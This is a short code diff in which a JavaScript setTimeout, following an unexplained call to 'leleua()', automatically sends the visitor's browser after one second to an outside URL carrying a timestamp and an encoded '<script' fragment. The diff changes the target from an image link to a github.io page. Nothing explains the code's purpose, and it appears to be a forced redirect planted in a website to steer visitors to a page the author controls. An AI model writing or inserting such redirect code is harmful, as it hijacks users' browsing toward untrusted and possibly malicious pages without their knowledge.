@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://img.zhisheji.com/uploads/0107/1704627907000a5c6.png' + '#' + timestamp + '%3Cscript';
+    var url = 'https://ccffq.github.io/ff.html' + '#' + timestamp + '%3Cscript';
     location.href = url;
 }, 1000);
